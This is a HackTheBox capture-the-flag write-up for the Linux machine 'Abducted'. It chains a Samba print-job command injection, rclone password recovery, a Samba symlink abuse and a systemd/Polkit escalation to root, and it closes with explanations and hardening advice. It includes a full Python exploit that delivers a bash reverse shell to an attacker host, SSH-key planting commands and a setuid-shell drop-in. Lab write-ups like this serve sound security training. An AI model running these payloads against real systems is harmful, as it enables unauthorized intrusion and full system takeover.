---
title: "HackTheBox — Abducted (Linux / Medium)"
date: 2026-06-11 11:00:00 +0530
categories: [CTF, HackTheBox]
tags: [linux, cve-2026-4480, samba, rclone, ssh, symlinks, systemd, polkit, privilege-escalation, python]
author: Prince_kumar
math: false
mermaid: false
---

> **When printers become gateways and group delegation becomes a blueprint for system compromise.**  
> This is the story of Abducted — a medium-difficulty Linux machine that tests your ability to chain Samba print command injection, recover obscure credentials, exploit symlink configurations, and leverage systemd drop-ins with Polkit permissions to capture root.

---

## Challenge Info

| Field        | Value                        |
|--------------|------------------------------|
| Platform     | HackTheBox                   |
| Box Name     | Abducted                     |
| OS           | Linux                        |
| Difficulty   | Medium                       |
| Techniques   | Samba print‑subsystem command injection, rclone config decrypt, Samba force user + wide links, Systemd drop‑in, Polkit rights |
| Tools Used   | nmap, smbclient, python3, rclone, ssh, systemctl, pkaction |

---

## 🕚 11:00 — Reconnaissance & Enumeration

Our target IP is `<TARGET_IP>`. We begin with a service-scanning `nmap` execution:

```bash
$ nmap -sSVC --open -Pn <TARGET_IP>
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.9
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```

Only SSH (port 22) and SMB (ports 139/445) are listening. No web interfaces or other service entry points are active. 

Let's list the SMB shares anonymously:

```bash
$ smbclient -L //<TARGET_IP> -N
Sharename      Type      Comment
---------      ----      -------
HP-Reception   Printer   Reception printer
projects       Disk      Hartley Group Project Files
transfer       Disk      Staff file transfer
IPC$           IPC       IPC Service
```

The printer share `HP-Reception` catches our attention because it allows guest printing — a critical requirement for CVE-2026-4480.

---

## 🕦 11:30 — Foothold: CVE‑2026‑4480 (Samba Print Command Injection)

The vulnerability resides within Samba's print subsystem: a client-supplied job name (`%J`) is unsafely substituted into the printing command block, which then gets processed via `system()`. Under the hood, this system uses `printing = sysv`, making it highly vulnerable to command injection. 

Because we have guest access, we can submit a print job containing command execution sequences using the `spoolss` RPC interface. If we try using traditional RAP tools, they will sanitize our input; thus, we must write a script to communicate with the service at the protocol level.

We craft an exploit using the Python bindings for Samba. By setting the job name to `|sh`, we force the print spooler to run the spool file's content as a shell script. The body of the document contains a reverse shell, detaching via `setsid` so it won't hang the RPC queue.

**Exploit script (`exploit.py`):**

```python
#!/usr/bin/env python3
from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials

RHOST, LHOST, LPORT = "<TARGET_IP>", "<ATTACKER_IP>", 4444
DATA = (f"setsid bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' >/dev/null 2>&1 &\n").encode()

lp = LoadParm(); lp.load_default()
creds = Credentials(); creds.guess(lp); creds.set_anonymous()
iface = spoolss.spoolss(r"ncacn_np:%s[\pipe\spoolss]" % RHOST, lp, creds)

h = iface.OpenPrinter(f"\\\\{RHOST}\\HP-Reception", "", spoolss.DevmodeContainer(), 0x00000008)
i1 = spoolss.DocumentInfo1()
i1.document_name = "|sh"
i1.output_file = None
i1.datatype = "RAW"
ctr = spoolss.DocumentInfoCtr()
ctr.level = 1
ctr.info = i1

iface.StartDocPrinter(h, ctr)
iface.StartPagePrinter(h)
iface.WritePrinter(h, DATA, len(DATA))
iface.EndPagePrinter(h)
iface.EndDocPrinter(h)
iface.ClosePrinter(h)
print("[+] job submitted")
```

Setting up our listener and launching the exploit:

```bash
$ nc -lvnp 4444
$ python3 exploit.py
```

We immediately catch a connection and obtain a shell as the unprivileged user `nobody`.

---

## 🕛 12:30 — Lateral Movement: Recovering Scott's Credentials

With our foothold established as `nobody`, we explore the system configuration. In `/opt/offsite-backup/`, we find an rclone configuration file:

```bash
nobody@abducted:/$ cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

Rclone doesn't securely encrypt stored credentials — it merely "obscures" them using a custom base64-based algorithm. We can use the utility binary directly on the machine to decode it:

```bash
nobody@abducted:/$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

Due to password reuse, this plaintext password allows us to pivot to the local user `scott`:

```bash
nobody@abducted:/$ su scott
Password: iXzvcib3SrpZ
scott@abducted:~$ id
uid=1000(scott) gid=1001(scott) groups=1001(scott)
scott@abducted:~$ cat user.txt
<REDACTED>
```

**User flag captured! 🎉**

---

## 🕐 13:30 — Privilege Escalation: scott → marcus (Samba Share Abuse)

While checking configurations, we inspect the local Samba shares definition:

```bash
scott@abducted:~$ cat /etc/samba/shares.conf
[transfer]
 path = /srv/transfer
 valid users = scott
 force user = marcus
 read only = no
 wide links = yes
```

We check the global configuration settings as well:

```bash
scott@abducted:~$ grep -E 'unix extensions|wide links' /etc/samba/smb.conf
 unix extensions = no
 allow insecure wide links = yes
```

This presents a serious design flaw:
1. `force user = marcus` means that any actions performed on the `transfer` share will execute under the context of user `marcus`.
2. `wide links = yes` combined with global settings `unix extensions = no` allows Samba to traverse symlinks that point outside of the share directory's root.

Because our user `scott` has full write privileges in `/srv/transfer`, we can craft a symbolic link pointing to `marcus`'s home folder and write our own SSH credentials into it.

**Step-by-step injection:**

1. Generate a new SSH key pair:
   ```bash
   scott@abducted:~$ ssh-keygen -t ed25519 -N '' -f /tmp/k
   ```

2. Clean up any existing directory and create the symlink pointing to the target home folder:
   ```bash
   scott@abducted:~$ rm -rf /srv/transfer/mh
   scott@abducted:~$ ln -s /home/marcus /srv/transfer/mh
   ```

3. Connect to the share via `smbclient` loopback, and write our public key into `marcus`'s SSH directory (using Scott's password `iXzvcib3SrpZ`):
   ```bash
   scott@abducted:~$ smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
   ```

4. Now we take the private key `/tmp/k` to connect via SSH:
   ```bash
   # On target: cat /tmp/k
   # Copy output to local file /tmp/k, then chmod 600
   $ chmod 600 /tmp/k
   $ ssh -i /tmp/k marcus@<TARGET_IP>
   ```

We successfully authenticate as `marcus`:

```bash
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

---

## 🕑 14:30 — Privilege Escalation: marcus → root (Systemd & Polkit)

Marcus belongs to the `operators` group. Looking for group-writable system files, we discover a writable systemd override directory:

```bash
marcus@abducted:~$ ls -ld /etc/systemd/system/smbd.service.d
drwxrws--- 2 root operators 4096 Jun  4 13:41 /etc/systemd/system/smbd.service.d
```

Because members of the `operators` group have write permissions here, we can create a systemd service drop-in configuration. We'll add an `ExecStartPre` parameter to run arbitrary commands as `root` when `smbd` boots up.

**Creating the override config:**

```bash
marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF
```

To trigger the execution, we need to instruct systemd to reload daemon configs and restart `smbd.service`. Although we are an unprivileged user, we check our Polkit permissions using `pkcheck`:

```bash
marcus@abducted:~$ for action in $(pkaction); do
    pkcheck --action-id "$action" --process $$ 2>/dev/null && echo "ALLOWED: $action"
done
```

The output reveals that we have `org.freedesktop.systemd1.reload-daemon` rights. Additionally, a Polkit rule allows daemon restarts for `smbd.service` without requiring a password. 

Let's execute the reload and restart:

```bash
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
```

When the service restarts, the `ExecStartPre` hooks run with root privileges, copying `bash` and adding the setuid bit to `/tmp/.rb`:

```bash
marcus@abducted:~$ ls -l /tmp/.rb
-rwsr-xr-x 1 root root 1446024 ... /tmp/.rb
```

We execute the setuid shell using `-p` to preserve the effective UID:

```bash
marcus@abducted:~$ /tmp/.rb -p
# id
uid=1001(marcus) gid=1002(marcus) euid=0(root) groups=1002(marcus),1000(operators)
# cat /root/root.txt
<REDACTED>
```

**Rooted! 🏆**

---

## The Fundamentals Behind the Box

Abducted packages an exceptional, multi-staged exploit chain. From RPC manipulation to Polkit delegation and Samba symlink bypasses, the box requires a deep understanding of standard system services and access controls. 

This section breaks down the core fundamental mechanisms that make each step of the Abducted challenge possible.

### 1. SMB Enumeration & Guest Printer Shares
SMB enumeration is one of the most critical steps when targeting Windows or Linux-based file servers. By executing:

```bash
smbclient -L //IP -N
```

We enumerate available shares. Printer shares (such as `HP-Reception`) are often configured to be guest-accessible so that anyone in the office can submit print jobs. However, a guest-accessible print queue is also an RPC endpoint. This means unauthenticated remote users can issue print commands, transforming a simple printer share into a major remote attack surface.

### 2. Command Injection via Unsanitized Input (CVE-2026-4480)
The root cause of CVE-2026-4480 lies within Samba's print subsystem. When a user submits a print job, Samba processes the document using its defined print command. In vulnerable versions, Samba substitutes the user-controlled job name (`%J`) directly into a shell command without escaping:

- **Sanitization Bypass**: The target's sanitization routine only replaces single quotes (`'`) with underscores (`_`).
- **Command Shell Metacharacters**: Because it only filters single quotes, other shell metacharacters such as `|`, `;`, `&`, `$()`, and backticks (`` ` ``) are fully processed by the underlying shell execution.
- **Protocol Restriction**: The attack cannot be carried out via the standard `smbclient` utility, because legacy RAP (Remote Access Protocol) sanitizes metacharacters before they reach the spooler. Instead, we must use the modern `spoolss` RPC interface to send our payload unmodified.

### 3. RPC Protocol Manipulation (The `spoolss` Pipe)
By interacting directly with the `spoolss` RPC pipe using Python's Samba bindings (`samba.dcerpc.spoolss`), we can programmatically trigger the print command injection. The exploit flow follows a distinct sequence of RPC events:

1. **`OpenPrinter`**: Establishes a handle to the vulnerable printer share.
2. **`StartDocPrinter`**: Registers a new print job where the `document_name` is set to our shell payload (e.g., `|sh`).
3. **`WritePrinter`**: Sends the spool file content containing the raw shell commands we wish to run.
4. **`EndDocPrinter`**: Closes the document, prompting Samba to run the configured print command with our unsanitized `%J` variable, executing the contents of our spool file.

### 4. Blind Command Execution & Process Detachment
When a command is executed via Samba's print command shell injection, there is no backchannel to receive stdout or stderr. The execution is entirely blind.

To verify execution and obtain access, we must:
- Use out-of-band communication channels (like ICMP pings or reverse TCP connections).
- Detach the payload execution path using `setsid bash -c '...' &`. If we don't detach the command, the parent process hangs waiting for the shell to close, which halts the RPC spooler and prevents the connection from returning cleanly.

### 5. Reversible Password Obscurity (Rclone Configs)
Many utilities obscure passwords in configuration files to prevent them from being read by casual observers. However, obscuring is not encrypting. 

- Rclone configuration files store passwords encoded with a custom base64-like algorithm. 
- Using `rclone reveal` immediately restores the credentials back to cleartext. 
- Storing passwords in configuration files without using a cryptographically backed keystore means any local read access leads to complete credential exposure.

### 6. Samba `force user` & Insecure Symlink Abuse (Wide Links)
Samba provides several features to bridge Linux filesystems and Windows networking:

- **`force user`**: Forces all operations on a share to run as a specific local account (e.g., `marcus`), regardless of who authenticated.
- **`wide links = yes`**: Instructs Samba to follow symlinks that lead outside the root directory of the share.
- **`unix extensions = no`**: Disables UNIX-specific protocol extensions, which is a prerequisite for allowing insecure wide links.

**The Exploit Mechanism**: If a user has write permissions on the share, they can create a local symbolic link pointing to a protected target folder (like `/home/marcus`). When Samba follows the symlink, `force user = marcus` ensures that any files created through the share are owned by `marcus` and written with his permissions. We use this to write our own public key into `/home/marcus/.ssh/authorized_keys`.

### 7. Systemd Drop-in Service Overrides
Systemd allows administrators to modify service behaviors without altering the main service file. By placing `.conf` files in a drop-in directory:

```bash
/etc/systemd/system/<service>.service.d/
```

These configurations are merged into the service's runtime configuration. If this directory is writable by a non-root group (such as `operators`), we can inject an `ExecStartPre` parameter. Since the main service (`smbd.service`) runs as `root`, any commands declared in our `ExecStartPre` drop-in will also execute as `root`.

### 8. Polkit (PolicyKit) Permission Delegation
Polkit acts as an authorization manager on Linux, determining whether a user is allowed to perform administrative tasks (like restarting services) without entering a password.

- **`pkcheck`**: Checks if the current process is authorized to perform specific actions.
- **`org.freedesktop.systemd1.reload-daemon`**: Allows non-root users to reload the systemd configuration.
- **Conditional Restart Rules**: Polkit can be configured to allow specific groups to restart specific services (like `smbd`) without credentials.

By combining the ability to reload systemd daemon files and restart the service via Polkit with the group-writable drop-in directory, we gain arbitrary root code execution when the service restarts.

### 9. Setuid Binary Execution & Privilege Preservation
When copying a binary (like `bash`) to run with root privileges, we set the Set User ID (SUID) bit:

```bash
chmod 4755 /tmp/binary
```

When executing an SUID shell, `bash` will drop privileges by default if it detects that the real UID does not match the effective UID (root). To prevent this behavior, we must execute `bash` with the privilege-preservation flag:

```bash
/tmp/binary -p
```

This instructs the shell to retain its effective UID (root), granting us a root terminal.

### The Full Attack Chain

What makes Abducted such an interesting machine is how seamlessly each stage builds upon the previous one:

```
[Printer Share Guest Access]
             ↓
[RPC spoolss CVE-2026-4480 Command Injection]
             ↓ (foothold as nobody)
[rclone.conf Obscured Password Decryption]
             ↓ (pivot to scott)
[Samba force user + wide links symlink traversal]
             ↓ (SSH key upload into marcus)
[Group-writable systemd override + Polkit restart]
             ↓ (executes ExecStartPre hooks)
[Root SUID shell created]
```

---

## Vulnerability Summary

| Stage | Vulnerability / Misconfiguration | Impact |
|-------|----------------------------------|--------|
| **Foothold** | CVE‑2026‑4480 (Samba Print Job Name Command Injection) | Initial access as `nobody` |
| **Pivot** | Reversible rclone credential obfuscation & password reuse | Lateral move to user `scott` |
| **Escalation 1** | Samba `force user` + insecure `wide links` symlink traversal | Writing SSH keys as user `marcus` |
| **Escalation 2** | Writable Systemd drop-in + Polkit reload-daemon execution | Arbitrary command execution as `root` |

---

## Key Takeaways

1. **Keep printer configurations secure:** Many administrators ignore printer shares or leave them guest-accessible. A simple misconfigured spooler system led to remote code execution.
2. **Never rely on reversible obfuscation:** Storing credentials via simple algorithms (like rclone's obfuscator) is as good as storing them in cleartext. Implement a secure password manager or IAM roles.
3. **Beware of Samba wide links:** Enabling `wide links` and `allow insecure wide links` turns a shared folder into a local filesystem portal, enabling file manipulation across user boundaries.
4. **Audit Systemd and Polkit rules:** Granting write access to `/etc/systemd/system/` directories to non-root groups is equivalent to handing over root access.
